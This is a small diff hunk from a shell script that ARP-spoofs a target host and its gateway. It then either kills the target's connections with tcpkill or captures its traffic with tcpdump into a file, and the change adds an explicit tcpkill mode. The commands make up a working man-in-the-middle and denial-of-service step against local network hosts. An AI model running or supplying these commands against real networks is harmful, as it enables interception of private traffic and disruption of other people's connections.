@@ -29,7 +29,7 @@ arpspoof -i $modul -t $ip -r $gateway &
 
 sleep 2
 
-if [ -z "$3" ]; then
+if [ -z "$3" ] || [ "$3" == "tcpkill" ]; then
   tcpkill -9 host $ip
 elif [ "$3" == "tcpdump" ]; then
   tcpdump -i $modul -A host $ip > out.txt
